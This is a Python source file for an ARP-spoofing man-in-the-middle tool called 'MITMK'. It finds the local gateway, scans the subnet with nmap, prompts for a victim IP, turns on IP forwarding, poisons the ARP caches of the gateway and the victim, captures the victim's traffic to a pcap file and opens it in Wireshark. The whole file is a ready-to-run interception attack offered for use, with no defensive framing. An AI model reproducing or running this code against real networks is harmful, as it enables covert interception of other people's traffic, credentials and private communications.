from scapy.all import *
import threading
import os
from time import sleep
import signal
from subprocess import Popen , PIPE

helP='''
+----------------------------------------------------------------+
|  \033[0;49;92m[*] \033[0m if you first run the tool you have to run setup.py first |
|  \033[0;49;92m[*] \033[0m usege :python setup.py                                   | 
|  \033[0;49;92m[*] \033[0m run the tool as super user                               |
+----------------------------------------------------------------+
'''
print (helP) 
class MITM:
    gateway_ip=[]
    gateway_mac=[]
    target_ip=[]
    target_mac=[]
    interface=[]
    
    def arp_poison(self,gateway_ip,gateway_mac,target_ip,target_mac):
        while True:  
            try:
                send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
                sleep(700)
            except KeyboardInterrupt:
                pass
    
    def get_mac(self,Ip):
        resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=Ip), retry=2, timeout=10)
        for s,r in resp:
            return r[ARP].hwsrc
                        
    def snnif(self):
        os.system('clear')
        try:          
            print('    +----------------------------------------------------------------+')
            print('    |      Man In The Middle Knife (MITMK) v1.0                      |')
            print('    |      by:raouf maklouf                                          |')
            print('    |                                                                |')
            print('    |                         snnifing start                         |')
            print('    +------------------------[CTRL-C to stop]------------------------+')
            
            
            filter_sniff="ip host " + self.target_ip
            packets=sniff(filter=filter_sniff, iface=self.interface, count=65000) 
            wrpcap("capterpkt.pcap", packets)        
            
          
        except KeyboardInterrupt :
            pass   

com1=("ip route | grep 'default' | cut -d ' ' -f 3  ")        
proc1=Popen([com1],stdout=PIPE,shell=True)
g_ip=proc1.communicate()[0]
g_ipnet=g_ip.rstrip("\n")
g_ip=g_ipnet[:-1]



host=('%s0/24'%g_ip)
com3=("nmap  -sn {} | grep 'Nmap scan report for' | cut -d ' ' -f 5".format(str(host)))
proc3=Popen([com3],stdout=PIPE,shell=True)
scanR=proc3.communicate()[0]



com2=("ip link show | grep '<' | cut -d ':' -f 2")
proc2=Popen([com2],stdout=PIPE,shell=True)
ifaces=proc2.communicate()[0]


mitm=MITM()
print('your gateway :{}'.format(g_ipnet))

print('your interfaces : \n{}\n'.format(ifaces))
inface=raw_input('\033[0;49;92m[*]\033[0m Enter interface: ')
print('')
print('hosts in network :\n{}'.format(scanR))
t_ip=raw_input('\033[0;49;92m[*]\033[0m Enter target ip: ')

mitm.interface=inface
mitm.gateway_ip=g_ipnet
mitm.target_ip=t_ip
mitm.gateway_mac=mitm.get_mac(mitm.gateway_ip)
mitm.target_mac=mitm.get_mac(mitm.target_ip)

os.system(" echo 1 > /proc/sys/net/ipv4/ip_forward")
if __name__=="__main__":
    try:
        poison_thread = threading.Thread(target=mitm.arp_poison, args=(mitm.gateway_ip, mitm.gateway_mac, mitm.target_ip, mitm.target_mac))
        poison_thread.start()
    except:
        pass
    mitm.snnif()
    
send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=mitm.gateway_ip, hwsrc=mitm.target_mac, psrc=mitm.target_ip), count=5)
send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=mitm.target_ip, hwsrc=mitm.gateway_mac, psrc=mitm.gateway_ip), count=5)        
os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
os.system('wireshark capterpkt.pcap')
os.kill(os.getpid(), signal.SIGTERM)

